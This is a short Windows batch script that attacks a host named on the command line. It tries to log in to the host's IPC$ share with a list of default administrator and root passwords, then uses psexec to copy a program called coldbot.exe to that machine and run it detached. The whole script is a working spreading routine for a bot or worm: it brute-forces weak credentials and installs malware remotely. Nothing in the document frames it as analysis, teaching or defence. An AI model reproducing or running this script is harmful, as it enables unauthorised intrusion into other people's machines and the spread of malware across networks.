@echo off
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
net use \\%1\ipc$ "" /user:Administrator
net use \\%1\ipc$ "admin" /user:Administrator
net use \\%1\ipc$ "admin" /user:administrator
net use \\%1\ipc$ "password" /user:administrator
net use \\%1\ipc$ "password" /user:Administrator
net use \\%1\ipc$ "12345" /user:Administrator
net use \\%1\ipc$ "1" /user:Administrator
net use \\%1\ipc$ "administrator" /user:administrator
net use \\%1\ipc$ "root" /user:root
net use \\%1\ipc$ "admin" /user:admin
psexec \\%1 attrib.exe -r coldbot.exe
psexec \\%1 -f -c -d coldbot.exe -o
psexec \\%1 -d coldbot.exe -o
